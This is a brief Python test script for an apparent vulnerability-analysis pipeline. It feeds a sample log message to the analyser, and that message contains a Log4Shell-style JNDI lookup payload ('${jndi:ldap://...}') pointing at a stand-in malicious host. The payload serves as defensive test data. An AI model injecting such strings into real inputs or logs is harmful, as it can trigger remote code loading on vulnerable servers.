from pipeline.models.vulnerability_analyzer import VulnerabilityAnalyzer
from pipeline.core.database import init_db
import logging

logging.basicConfig(level=logging.INFO)

print("Initializing DB to apply schema updates...")
init_db()

analyzer = VulnerabilityAnalyzer()

print("Testing vulnerability analysis (Log4j 2)...")
result = analyzer.analyze_vulnerability(
    vuln_type="Novel Log4j Exploit V2",
    log_message="ERROR: User input was evaluated. Pattern found: ${jndi:ldap://malicious.com/novel_payload} in Headers."
)
print("Result:", result)
